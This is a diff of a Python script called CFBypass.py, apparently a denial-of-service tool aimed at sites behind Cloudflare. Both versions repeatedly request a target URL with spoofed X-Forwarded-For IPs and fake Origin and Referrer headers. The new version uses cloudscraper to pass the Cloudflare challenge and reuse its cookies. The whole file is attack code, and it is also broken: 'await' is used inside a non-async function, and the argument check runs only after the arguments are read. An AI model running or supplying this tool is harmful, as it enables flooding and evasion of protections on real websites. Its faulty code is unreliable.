@@ -1,44 +1,56 @@
+import cloudscraper
 import requests
+import sys
 import random
+import string
 import time
-import threading
-import os
 
-def random_string(length):
-    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    return ''.join(random.choice(characters) for _ in range(length))
+url = sys.argv[1]
+time_interval = int(sys.argv[2])
 
-def random_ip():
-    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
+if len(sys.argv) <= 2:
+    print('Usage: python CFBypass.py <url> <time>')
+    sys.exit(-1)
 
-def main(url, time):
-    if len(sys.argv) <= 2:
-        print("Usage: python CFBypass.py <url> <time>")
-        sys.exit(-1)
+def random_byte():
+    return str(random.randint(0, 255))
 
-    def send_request():
+async def random_string_generate(length):
+    characters = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(characters) for i in range(length))
+
+def attack():
+    scraper = cloudscraper.create_scraper()
+    try:
+        response = scraper.get(url)
+        cookie = response.cookies.get_dict()
+        user_agent = response.request.headers['User-Agent']
+
+        random_string = await random_string_generate(10)
+        fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'
+
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+            'User-Agent': user_agent,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Upgrade-Insecure-Requests': 1,
-            'cookie': 'cookie_value',
-            'Origin': f"http://{random_string(10)}.com",
-            'Referrer': f"http://google.com/{random_string(10)}",
-            'X-Forwarded-For': random_ip()
+            'Upgrade-Insecure-Requests': '1',
+            'Cookie': '; '.join([f'{key}={value}' for key, value in cookie.items()]),
+            'Origin': f'http://{random_string}.com',
+            'Referrer': f'http://google.com/{random_string}',
+            'X-Forwarded-For': fake_ip
         }
-        response = requests.get(url, headers=headers)
-        print(response.status_code)
 
-    threads = []
-    for _ in range(int(time)):
-        thread = threading.Thread(target=send_request)
-        thread.start()
-        threads.append(thread)
+        requests.get(url, headers=headers)
 
-    for thread in threads:
-        thread.join()
+    except Exception as e:
+        print('Failed to get website data:', e)
 
-    print("CFBypass completed.")
+def main():
+    interval = time_interval
+    start_time = time.time()
 
-if __name__ == "__main__":
-    main(sys.argv[1], sys.argv[2])
+    while time.time() - start_time <= interval:
+        attack()
+        time.sleep(1)
+
+if __name__ == '__main__':
+    main()
